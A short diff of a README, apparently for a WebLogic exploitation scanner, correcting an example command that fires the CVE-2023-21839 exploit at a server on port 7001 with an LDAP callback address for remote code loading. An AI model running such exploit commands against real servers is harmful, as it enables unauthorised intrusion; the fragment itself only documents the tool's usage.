@@ -78,7 +78,7 @@ WeblogicScanner.exe -f "C:\Users\Test\Desktop\target.txt" -l ldap://127.0.0.1/#e
 + EXP单个利用，指定EXP末尾数字即可
 ```go
 //CVE-2023-21839
-WeblogicScanner.exe -u 127.0.0.1 -p 7001 -l ldap://127.0.0.1/#eval -e 14882
+WeblogicScanner.exe -u 127.0.0.1 -p 7001 -l ldap://127.0.0.1/#eval -e 21839
 
 //cve-2020-2883
 //cve-2020-2555
